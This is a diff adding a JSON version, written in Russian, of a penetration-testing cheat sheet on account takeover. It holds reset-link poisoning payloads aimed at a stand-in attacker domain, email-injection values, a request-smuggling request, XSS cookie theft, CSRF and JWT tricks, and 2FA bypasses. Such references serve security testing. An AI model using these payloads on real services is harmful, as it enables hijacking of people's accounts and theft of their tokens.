@@ -1,0 +1,230 @@
+{
+  "category": "Account Takeover",
+  "source": "PayloadsAllTheThings/Account Takeover/",
+  "entries": [
+    {
+      "subcategory": "Методология",
+      "title": "Что такое ATO и где его искать",
+      "language": "text",
+      "tags": ["methodology", "recon"],
+      "body": "Account Takeover (ATO) — несанкционированный захват чужого аккаунта через разные векторы. Основные поверхности атаки:\n• Восстановление пароля (password reset) — главный источник: утечка токена, отравление host-заголовка, IDOR, слабые/предсказуемые токены, манипуляции с email-параметром.\n• Коллизии и нормализация username/email (whitespace, Unicode).\n• Веб-уязвимости, ведущие к ATO: XSS (кража сессии), CSRF (смена пароля/email), HTTP Request Smuggling, манипуляции с JWT.\n• Обход MFA/2FA (см. отдельный раздел): манипуляция ответом, переиспользование кода, brute-force, backup-коды."
+    },
+    {
+      "subcategory": "Методология",
+      "title": "Восстановление пароля — чек-лист атак",
+      "language": "text",
+      "tags": ["methodology", "password-reset"],
+      "body": "1. Токен утекает через Referer на сторонние ресурсы.\n2. Отравление reset-ссылки через Host / X-Forwarded-Host (password reset poisoning).\n3. Подмешивание своего email через parameter pollution, массив, cc/bcc, разделители.\n4. IDOR в API смены пароля (подмена userID/email).\n5. Слабый/предсказуемый/переиспользуемый токен сброса.\n6. Утечка resetToken прямо в теле ответа сервера.\n7. Коллизия username (пробелы до/после) и Unicode-нормализация email."
+    },
+    {
+      "subcategory": "Восстановление пароля",
+      "title": "Утечка reset-токена через Referer",
+      "language": "text",
+      "tags": ["password-reset", "referer", "token-leak"],
+      "body": "1. Запроси сброс пароля на свой email.\n2. Перейди по reset-ссылке из письма.\n3. НЕ меняй пароль.\n4. Кликни по любой ссылке на сторонний сайт (например, Facebook, Twitter).\n5. Перехвати запрос в Burp Suite.\n6. Проверь, не утекает ли reset-токен в заголовке Referer.\n\nЕсли страница сброса грузит внешние ресурсы (аналитику, шрифты, виджеты), токен из URL может уйти на чужой домен в Referer."
+    },
+    {
+      "subcategory": "Восстановление пароля",
+      "title": "Password Reset Poisoning через Host-заголовок",
+      "language": "text",
+      "tags": ["password-reset", "host-header", "poisoning"],
+      "body": "1. Перехвати запрос на сброс пароля в Burp Suite.\n2. Добавь или измени заголовки: `Host: [ATTACKER.DOMAIN.TLD]`, `X-Forwarded-Host: [ATTACKER.DOMAIN.TLD]`.\n3. Отправь запрос с подменённым заголовком.\n4. Жди ссылку сброса, построенную по host-заголовку, вида: `https://[ATTACKER.DOMAIN.TLD]/reset-password.php?token=TOKEN`.\n\nЕсли бэкенд строит абсолютный URL письма по Host-заголовку, токен жертвы уйдёт на твой домен."
+    },
+    {
+      "subcategory": "Восстановление пароля",
+      "title": "Password Reset Poisoning — пример запроса",
+      "language": "http",
+      "tags": ["password-reset", "host-header"],
+      "body": "POST https://example.com/reset.php HTTP/1.1\nAccept: */*\nContent-Type: application/json\nHost: [ATTACKER.DOMAIN.TLD]"
+    },
+    {
+      "subcategory": "Восстановление пароля",
+      "title": "Подмешивание email через параметр (parameter pollution / cc / разделители)",
+      "language": "text",
+      "tags": ["password-reset", "email-param", "parameter-pollution"],
+      "body": "# parameter pollution\nemail=victim@mail.com&email=hacker@mail.com\n\n# array of emails\n{\"email\":[\"victim@mail.com\",\"hacker@mail.com\"]}\n\n# carbon copy\nemail=victim@mail.com%0A%0Dcc:hacker@mail.com\nemail=victim@mail.com%0A%0Dbcc:hacker@mail.com\n\n# separator\nemail=victim@mail.com,hacker@mail.com\nemail=victim@mail.com%20hacker@mail.com\nemail=victim@mail.com|hacker@mail.com"
+    },
+    {
+      "subcategory": "Восстановление пароля",
+      "title": "IDOR в API смены пароля",
+      "language": "text",
+      "tags": ["password-reset", "idor", "api"],
+      "body": "1. Залогинься под своим аккаунтом и зайди в функцию Change password.\n2. Запусти Burp Suite и перехвати запрос.\n3. Отправь в Repeater и подмени параметры: User ID / email на значения жертвы.\n\nЕсли смена пароля привязана к переданному, а не к сессионному идентификатору — пароль жертвы меняется."
+    },
+    {
+      "subcategory": "Восстановление пароля",
+      "title": "IDOR в API смены пароля — пример запроса",
+      "language": "http",
+      "tags": ["password-reset", "idor"],
+      "body": "POST /api/changepass\n[...]\n(\"form\": {\"email\":\"victim@email.com\",\"password\":\"securepwd\"})"
+    },
+    {
+      "subcategory": "Восстановление пароля",
+      "title": "Слабый/предсказуемый токен сброса",
+      "language": "text",
+      "tags": ["password-reset", "weak-token", "predictable"],
+      "body": "Токен сброса должен быть случайным и уникальным при каждом запросе. Проверь, истекает ли он и не повторяется ли — иногда алгоритм генерации слабый и токен можно угадать. В генерации могут участвовать предсказуемые данные:\n• Timestamp\n• UserID\n• Email пользователя\n• Имя и фамилия\n• Дата рождения\n• Криптография (слабая/самописная)\n• Только цифры\n• Короткая последовательность (<6 символов из [A-Z,a-z,0-9])\n• Переиспользование токена\n• Отсутствие срока годности токена"
+    },
+    {
+      "subcategory": "Восстановление пароля",
+      "title": "Утечка reset-токена в теле ответа",
+      "language": "text",
+      "tags": ["password-reset", "token-leak", "api"],
+      "body": "1. Запусти сброс пароля через API/UI для конкретного email, например: test@mail.com.\n2. Изучи ответ сервера и поищи поле `resetToken`.\n3. Используй токен в URL вида: `https://example.com/v3/user/password/reset?resetToken=[THE_RESET_TOKEN]&email=[THE_MAIL]`."
+    },
+    {
+      "subcategory": "Коллизии и нормализация",
+      "title": "Сброс пароля через коллизию username (пробелы)",
+      "language": "text",
+      "tags": ["username-collision", "whitespace", "cve-2020-7245"],
+      "body": "1. Зарегистрируйся с username, идентичным username жертвы, но с пробелами до и/или после, например: `\"admin \"`.\n2. Запроси сброс пароля для своего «вредоносного» username.\n3. Используй токен из своего письма и сбрось пароль жертвы.\n4. Зайди в аккаунт жертвы с новым паролем.\n\nПлатформа CTFd была уязвима к такой атаке — CVE-2020-7245."
+    },
+    {
+      "subcategory": "Коллизии и нормализация",
+      "title": "ATO через Unicode-нормализацию",
+      "language": "text",
+      "tags": ["unicode", "normalization", "email"],
+      "body": "При обработке Unicode-ввода (case mapping или нормализация) возможно неожиданное поведение: разные символы схлопываются в один и две учётки считаются «одинаковыми».\n\n• Аккаунт жертвы: `demo@gmail.com`\n• Аккаунт атакующего: `demⓞ@gmail.com`\n\nИнструменты: Unisub (подбор Unicode-символов, схлопывающихся в нужный символ) и Unicode pentester cheatsheet (список подходящих символов под конкретную платформу)."
+    },
+    {
+      "subcategory": "ATO через веб-уязвимости",
+      "title": "ATO через XSS (кража сессии)",
+      "language": "text",
+      "tags": ["xss", "session", "cookie"],
+      "body": "1. Найди XSS в приложении или на поддомене, если cookie заскоплены на родительский домен: `*.domain.com`.\n2. Укради текущую сессионную cookie.\n3. Аутентифицируйся как пользователь по этой cookie.\n\nЕсли сессионная cookie без флага HttpOnly или скоп слишком широкий — XSS на любом поддомене ведёт к ATO."
+    },
+    {
+      "subcategory": "ATO через веб-уязвимости",
+      "title": "ATO через HTTP Request Smuggling",
+      "language": "text",
+      "tags": ["http-smuggling", "smuggler"],
+      "body": "См. также страницу уязвимости HTTP Request Smuggling.\n\n1. Определи тип смаглинга (CL, TE, CL.TE) с помощью smuggler:\n\ngit clone https://github.com/defparam/smuggler.git\ncd smuggler\npython3 smuggler.py -h\n\n2. Сконструируй запрос, который перезапишет `POST / HTTP/1.1` следующими данными:\n\nGET http://[ATTACKER.DOMAIN.TLD]  HTTP/1.1\nX:\n\n3. Итоговый запрос может выглядеть так (см. отдельную запись с примером)."
+    },
+    {
+      "subcategory": "ATO через веб-уязвимости",
+      "title": "HTTP Request Smuggling — итоговый запрос",
+      "language": "http",
+      "tags": ["http-smuggling", "cl.te"],
+      "body": "GET /  HTTP/1.1\nTransfer-Encoding: chunked\nHost: something.com\nUser-Agent: Smuggler/v1.0\nContent-Length: 83\n\n0\n\nGET http://[ATTACKER.DOMAIN.TLD]  HTTP/1.1\nX: X"
+    },
+    {
+      "subcategory": "ATO через веб-уязвимости",
+      "title": "ATO через CSRF",
+      "language": "text",
+      "tags": ["csrf", "password-change"],
+      "body": "1. Создай CSRF-payload, например HTML-форму с автосабмитом на смену пароля.\n2. Доставь payload жертве.\n\nЕсли смена пароля/email не защищена CSRF-токеном и не требует ввода текущего пароля — захват аккаунта."
+    },
+    {
+      "subcategory": "ATO через веб-уязвимости",
+      "title": "ATO через JWT",
+      "language": "text",
+      "tags": ["jwt", "auth-bypass"],
+      "body": "JWT может использоваться для аутентификации пользователя.\n\n• Поменяй в JWT другой User ID / Email.\n• Проверь слабую подпись JWT (alg:none, слабый секрет, confusion RS256→HS256)."
+    },
+    {
+      "subcategory": "Обход 2FA / MFA",
+      "title": "Манипуляция ответом (Response Manipulation)",
+      "language": "text",
+      "tags": ["2fa-bypass", "response-manipulation"],
+      "body": "Если в ответе `\"success\":false`, поменяй на `\"success\":true`.\n\nКлиент может доверять флагу из ответа и пускать дальше при подделке ответа в прокси."
+    },
+    {
+      "subcategory": "Обход 2FA / MFA",
+      "title": "Манипуляция статус-кодом (Status Code Manipulation)",
+      "language": "text",
+      "tags": ["2fa-bypass", "status-code"],
+      "body": "Если статус-код 4xx, попробуй заменить его на 200 OK и проверь, снимает ли это ограничение."
+    },
+    {
+      "subcategory": "Обход 2FA / MFA",
+      "title": "Утечка 2FA-кода в ответе",
+      "language": "text",
+      "tags": ["2fa-bypass", "code-leak"],
+      "body": "Проверь ответ на запрос, инициирующий отправку 2FA-кода — иногда сам код утекает прямо в теле ответа."
+    },
+    {
+      "subcategory": "Обход 2FA / MFA",
+      "title": "Анализ JS-файлов",
+      "language": "text",
+      "tags": ["2fa-bypass", "js-analysis"],
+      "body": "Редко, но некоторые JS-файлы содержат информацию о 2FA-коде — стоит проверить."
+    },
+    {
+      "subcategory": "Обход 2FA / MFA",
+      "title": "Переиспользование 2FA-кода",
+      "language": "text",
+      "tags": ["2fa-bypass", "code-reuse"],
+      "body": "Один и тот же код можно использовать повторно (нет инвалидации после первого успешного применения)."
+    },
+    {
+      "subcategory": "Обход 2FA / MFA",
+      "title": "Отсутствие защиты от brute-force",
+      "language": "text",
+      "tags": ["2fa-bypass", "brute-force"],
+      "body": "Можно перебрать 2FA-код любой длины — нет rate-limit и лимита попыток."
+    },
+    {
+      "subcategory": "Обход 2FA / MFA",
+      "title": "Отсутствие проверки принадлежности кода (Missing Integrity Validation)",
+      "language": "text",
+      "tags": ["2fa-bypass", "integrity"],
+      "body": "Код, выданный для любого аккаунта, проходит проверку 2FA на другом аккаунте (код не привязан к конкретному пользователю)."
+    },
+    {
+      "subcategory": "Обход 2FA / MFA",
+      "title": "CSRF на отключении 2FA",
+      "language": "text",
+      "tags": ["2fa-bypass", "csrf"],
+      "body": "На отключении 2FA нет CSRF-защиты, и нет подтверждения аутентификацией — можно отключить 2FA жертвы через подделанный запрос."
+    },
+    {
+      "subcategory": "Обход 2FA / MFA",
+      "title": "Сброс пароля отключает 2FA",
+      "language": "text",
+      "tags": ["2fa-bypass", "password-reset"],
+      "body": "2FA отключается при смене пароля / смене email — после сброса можно зайти без второго фактора."
+    },
+    {
+      "subcategory": "Обход 2FA / MFA",
+      "title": "Злоупотребление backup-кодами",
+      "language": "text",
+      "tags": ["2fa-bypass", "backup-codes"],
+      "body": "Обход 2FA через функцию backup-кодов. Примени к backup-коду те же техники (response/status manipulation, brute-force, отсутствие привязки), чтобы снять/сбросить ограничения 2FA."
+    },
+    {
+      "subcategory": "Обход 2FA / MFA",
+      "title": "Clickjacking на странице отключения 2FA",
+      "language": "text",
+      "tags": ["2fa-bypass", "clickjacking"],
+      "body": "Помести страницу отключения 2FA в iframe и социальной инженерией заставь жертву отключить 2FA (если нет X-Frame-Options / CSP frame-ancestors)."
+    },
+    {
+      "subcategory": "Обход 2FA / MFA",
+      "title": "Включение 2FA не завершает активные сессии",
+      "language": "text",
+      "tags": ["2fa-bypass", "session"],
+      "body": "Если сессия уже угнана и есть уязвимость с таймаутом сессии — включение 2FA не инвалидирует ранее активные сессии, доступ сохраняется."
+    },
+    {
+      "subcategory": "Обход 2FA / MFA",
+      "title": "Обход 2FA через Force Browsing",
+      "language": "text",
+      "tags": ["2fa-bypass", "force-browsing"],
+      "body": "Если при включённом 2FA логин редиректит на `/2fa/verify`, а без 2FA — сразу на `/my-account`, попробуй вручную перейти на `/my-account` вместо `/2fa/verify`, чтобы пропустить верификацию."
+    },
+    {
+      "subcategory": "Обход 2FA / MFA",
+      "title": "Обход 2FA значением null или 000000",
+      "language": "text",
+      "tags": ["2fa-bypass", "null", "default-value"],
+      "body": "Введи код 000000 или null, чтобы обойти защиту 2FA (бэкенд может трактовать пустое/дефолтное значение как валидное)."
+    },
+    {
+      "subcategory": "Обход 2FA / MFA",
+      "title": "Обход 2FA через массив (array)",
+      "language": "json",
+      "tags": ["2fa-bypass", "array", "type-juggling"],
+      "body": "{\n    \"otp\":[\n        \"1234\",\n        \"1111\",\n        \"1337\", // GOOD OTP\n        \"2222\",\n        \"3333\",\n        \"4444\",\n        \"5555\"\n    ]\n}"
+    }
+  ]
+}
